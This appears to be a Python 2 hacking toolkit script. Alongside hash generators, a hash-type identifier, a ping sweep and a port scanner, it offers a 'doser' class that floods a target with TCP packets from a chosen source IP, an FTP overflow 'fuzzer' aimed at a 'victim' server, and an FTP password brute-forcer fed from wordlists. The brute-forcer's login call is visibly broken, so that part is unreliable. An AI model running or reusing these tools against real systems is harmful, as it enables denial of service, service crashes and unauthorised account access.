#!/usr/bin/python
#Creator -> Shahid khan
#Project starting date -> 7 august 2017
#Project done -> 8 august 2017
# -*- coding: ascii -*-
# encoding=utf8 
import os
import collections
import platform
import subprocess
import threading
import socket
import ftplib
import sys
import random
from scapy.all import *
from subprocess import call
import struct
from datetime import datetime
import hashlib
import re
import urllib2
from urllib import *
from random import randint
from re import search, findall
import SocketServer
import SimpleHTTPServer

class Hasher:
	def md5(self):
		message = raw_input('Enter the string you would like to hash: ')
		md5 = hashlib.md5(message.encode())
		print "Your Hash is Ready"
		print (md5.hexdigest())

	def sha1(self):
		message = raw_input("Enter the string you would like to hash: ")
		sha = hashlib.sha1(message)
		sha1 = sha.hexdigest()
		print"Your Hash is Ready ;-)"
		print sha1
	
	def sha224(self):
		message = raw_input("Enter the string you would like to hash: ")
		sha = hashlib.sha224(message)
		sha128 = sha.hexdigest()
		print"Your Hash is Ready ;-)"
		print sha128

	def sha256(self):
		message = raw_input("Enter the string you would like to hash: ")
		sha = hashlib.sha256(message)
		sha256 = sha.hexdigest()
		print"Your Hash is Ready ;-)"
		print sha256

	def sha384(self):
		message = raw_input("Enter the string you would like to hash: ")
		sha = hashlib.sha384(message)
		sha384 = sha.hexdigest()
		print"Your Hash is Ready ;-)"
		print sha384

	def sha512(self):
		message = raw_input("Enter the string you would like to hash: ")
		sha = hashlib.sha512(message)
		sha512 = sha.hexdigest()
		print"Your Hash is Ready ;-)"
		print sha512

class identifier:
	def hashid(self):

		def hashcheck (hashtype, regexstr, data):
			try:
				valid_hash = re.finditer(regexstr, data)
				result = [match.group(0) for match in valid_hash]
				if result:
					return "This hash matches the format of: " + hashtype
			except: pass
		string_to_check = raw_input('Please enter the hash you wish to check: ')
		hashes = (
		("Blowfish(Eggdrop)", r"^\+[a-zA-Z0-9\/\.]{12}$"),
		("Blowfish(OpenBSD)", r"^\$2a\$[0-9]{0,2}?\$[a-zA-Z0-9\/\.]{53}$"),
		("Blowfish crypt", r"^\$2[axy]{0,1}\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{1,}$"),
		("DES(Unix)", r"^.{0,2}[a-zA-Z0-9\/\.]{11}$"),
		("MD5(Unix)", r"^\$1\$.{0,8}\$[a-zA-Z0-9\/\.]{22}$"),
		("MD5(APR)", r"^\$apr1\$.{0,8}\$[a-zA-Z0-9\/\.]{22}$"),
		("MD5(MyBB)", r"^[a-fA-F0-9]{32}:[a-z0-9]{8}$"),
		("MD5(ZipMonster)", r"^[a-fA-F0-9]{32}$"),
		("MD5 crypt", r"^\$1\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{1,}$"),
		("MD5 apache crypt", r"^\$apr1\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{1,}$"),
		("MD5(Joomla)", r"^[a-fA-F0-9]{32}:[a-zA-Z0-9]{16,32}$"),
		("MD5(Wordpress)", r"^\$P\$[a-zA-Z0-9\/\.]{31}$"),
		("MD5(phpBB3)", r"^\$H\$[a-zA-Z0-9\/\.]{31}$"),
		("MD5(Cisco PIX)", r"^[a-zA-Z0-9\/\.]{16}$"),
		("MD5(osCommerce)", r"^[a-fA-F0-9]{32}:[a-zA-Z0-9]{2}$"),
		("MD5(Palshop)", r"^[a-fA-F0-9]{51}$"),
		("MD5(IP.Board)", r"^[a-fA-F0-9]{32}:.{5}$"),
		("MD5(Chap)", r"^[a-fA-F0-9]{32}:[0-9]{32}:[a-fA-F0-9]{2}$"),
		("Juniper Netscreen/SSG (ScreenOS)", r"^[a-zA-Z0-9]{30}:[a-zA-Z0-9]{4,}$"),
		("Fortigate (FortiOS)", r"^[a-fA-F0-9]{47}$"),
		("Minecraft(Authme)", r"^\$sha\$[a-zA-Z0-9]{0,16}\$[a-fA-F0-9]{64}$"),
		("Lotus Domino", r"^\(?[a-zA-Z0-9\+\/]{20}\)?$"),
		("Lineage II C4", r"^0x[a-fA-F0-9]{32}$"),	
		("CRC-96(ZIP)", r"^[a-fA-F0-9]{24}$"),
		("NT crypt", r"^\$3\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{1,}$"),
		("Skein-1024", r"^[a-fA-F0-9]{256}$"),
		("RIPEMD-320", r"^[A-Fa-f0-9]{80}$"),
		("EPi hash", r"^0x[A-F0-9]{60}$"),
		("EPiServer 6.x < v4", r"^\$episerver\$\*0\*[a-zA-Z0-9]{22}==\*[a-zA-Z0-9\+]{27}$"),
		("EPiServer 6.x >= v4", r"^\$episerver\$\*1\*[a-zA-Z0-9]{22}==\*[a-zA-Z0-9]{43}$"),
		("Cisco IOS SHA256", r"^[a-zA-Z0-9]{43}$"),
		("SHA-1(Django)", r"^sha1\$.{0,32}\$[a-fA-F0-9]{40}$"),
		("SHA-1 crypt", r"^\$4\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{1,}$"),
		("SHA-1(Hex)", r"^[a-fA-F0-9]{40}$"),
		("SHA-1(LDAP) Base64", r"^\{SHA\}[a-zA-Z0-9+/]{27}=$"),
		("SHA-1(LDAP) Base64 + salt", r"^\{SSHA\}[a-zA-Z0-9+/]{28,}[=]{0,3}$"),
		("SHA-512(Drupal)", r"^\$S\$[a-zA-Z0-9\/\.]{52}$"),
		("SHA-512 crypt", r"^\$6\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{1,}$"),
		("SHA-256(Django)", r"^sha256\$.{0,32}\$[a-fA-F0-9]{64}$"),
		("SHA-256 crypt", r"^\$5\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{1,}$"),
		("SHA-384(Django)", r"^sha384\$.{0,32}\$[a-fA-F0-9]{96}$"),
		("SHA-256(Unix)", r"^\$5\$.{0,22}\$[a-zA-Z0-9\/\.]{43,69}$"),
		("SHA-512(Unix)", r"^\$6\$.{0,22}\$[a-zA-Z0-9\/\.]{86}$"),
		("SHA-384", r"^[a-fA-F0-9]{96}$"),
		("SHA-512", r"^[a-fA-F0-9]{128}$"),
		("SSHA-1", r"^({SSHA})?[a-zA-Z0-9\+\/]{32,38}?(==)?$"),
		("SSHA-1(Base64)", r"^\{SSHA\}[a-zA-Z0-9]{32,38}?(==)?$"),
		("SSHA-512(Base64)", r"^\{SSHA512\}[a-zA-Z0-9+]{96}$"),
		("Oracle 11g", r"^S:[A-Z0-9]{60}$"),
		("SMF >= v1.1", r"^[a-fA-F0-9]{40}:[0-9]{8}&"),
		("MySQL 5.x", r"^\*[a-f0-9]{40}$"),
		("MySQL 3.x", r"^[a-fA-F0-9]{16}$"),
		("OSX v10.7", r"^[a-fA-F0-9]{136}$"),
		("OSX v10.8", r"^\$ml\$[a-fA-F0-9$]{199}$"),
		("SAM(LM_Hash:NT_Hash)", r"^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$"),
		("MSSQL(2000)", r"^0x0100[a-f0-9]{0,8}?[a-f0-9]{80}$"),
		("MSSQL(2005)", r"^0x0100[a-f0-9]{0,8}?[a-f0-9]{40}$"),
		("MSSQL(2012)", r"^0x02[a-f0-9]{0,10}?[a-f0-9]{128}$"),
		("TIGER-160(HMAC)", r"^[a-f0-9]{40}$"),
		("SHA-256", r"^[a-fA-F0-9]{64}$"),
		("SHA-1(Oracle)", r"^[a-fA-F0-9]{48}$"),
		("SHA-224", r"^[a-fA-F0-9]{56}$"),
		("Adler32", r"^[a-f0-9]{8}$"),
		("CRC-16-CCITT", r"^[a-fA-F0-9]{4}$"),
		("NTLM)", r"^[0-9A-Fa-f]{32}$"),
		)
		counter = 0
		for h in hashes:
			text = hashcheck(h[0], h[1], string_to_check)
			if text is not None:
				counter += 1
				print text
		if counter == 0:
			print "Your input hash did not match anything, sorry!"

class scanner:
	def hostscanner(self):
		net = raw_input("Enter the Network Address: ")
		net1= net.split('.')
		a = '.'
		net2 = net1[0]+a+net1[1]+a+net1[2]+a
		print
		st1 = int(raw_input("Enter the Starting Host Number: "))
		print
		en1 = int(raw_input("Enter the Last Host Number: "))
		print
		en1=en1+1
		oper = platform.system()
		if (oper=="Windows"):
			ping1 = "ping -n 1 "
		elif (oper== "Linux"):
			ping1 = "ping -c 1 "
		else :
			ping1 = "ping -c 1 "
		t1= datetime.now()
		print "Scanning in Progress"
		for ip in xrange(st1,en1):
			addr = net2+str(ip)
			comm = ping1+addr
			response = os.popen(comm)
			for line in response.readlines():
				if(line.count("TTL")):
					break
				if (line.count("ttl")):
					print addr, "--> Actively Running On Your Network"
		t2= datetime.now()
		total =t2-t1
		print
		print "scanning complete in " , total

	def portscanner(self):
		net = raw_input("Enter the Network Address: ")
		#net1= net.split('.')
		#a = '.'
		#net2 = net1[0]+a+net1[1]+a+net1[2]+a
	
		p = raw_input('No. of Ports you want to scan: ')
		p1 = int(p)
		p2 = p1 + 1
		p3 = int(p2)
		for i in range(1, p3):
			s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			r=s.connect_ex((net, i))
			
			if r==0: 
				print "Port {}:	open".format(i)
				s.close()

				
class doser:
	def dos(self):
		src = raw_input("Enter the Source IP: ")
		print
		target = raw_input("Enter the Target IP: ")
		print
		srcport = int(raw_input("Enter the Source Port: "))
		print
		i=1
		while True:
			IP1 = IP(src=src, dst=target)
			TCP1 = TCP(sport=srcport, dport=80)
			pkt = IP1 / TCP1
			send(pkt,inter= .001)
			print "packet sent ", i
			i=i+1	

class fuzzer:
	def fuzz(self):
		inpt = raw_input('How many bytes you want to send to the victim: ')
		print
	
		fuzz = "A" * int(inpt)
	
		v =raw_input('Please enter the victims ip address: ')
		v1 = v.split('.')
		v2 = '.'
		v3 = v1[0]+v2+v1[1]+v2+v1[2]+v2+v1[3]
		print
		
		cmd = raw_input('Please give the command to fuzz: ')
		print
	
		
		user = raw_input('Please give the user name to connect: ')
		print
		password = raw_input('Please give the password to continue: ')
		
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((v3, 21))
		
		s.send('USER ' + user + '\r\n')
		s.recv(1024)
		
		s.send('PASS ' + password + '\r\n')
		s.recv(1024)
		
		s.send (cmd + fuzz + '\r\n')
		s.recv(1024)
		
		s.send('QUIT\r\n')
		
		s.close()
		print
	
		print str(inpt) + " Garbage send to the " + str(v3) + " where username = ", user + " and password = ", password
		print
		print "Now check the FTP server good luck"


class bruteforcer:
	def brutal(self):
	
		def connect(host,user,password):
			try:
				ftp = ftplib.FTP(host)
				ftp = login(user,password)
				ftp.quit()
				return True
			except:
				return False
		
		def target():
			print
			print "NOTE :- Please Copy your Password text File into the current folder"
			print	
			target = raw_input("Please enter the IP address: ")
			print	
			user = raw_input("Please enter USER name: ")
			print	
			passwordfile = raw_input("Please enter your Password text File name (Example:password.txt,rockyou.txt) : ")
			print
	    
			print '[+] Using anonymous credentials for ' + target
			if connect(target,'anonymous','anonymous'):
				print '[+] FTP Anonymous log on succeeded on host ' + target
			else:
				print '[-] FTP Anonymous log on failed on host ' + target
		
				passwordread = open(passwordfile, 'r')
		
				for line in passwordread.readlines():
					password = line.strip('\r').strip('\n')
					print "Testing: " + str(password)
		    
					if connect(target,user,password):
		
						print "[+] FTP Logon succeeded on host "+ target + "Username" + user + "Testing: " + password
						exit(0)
					else:
						print "[+] FTP Logon failed"
		target()


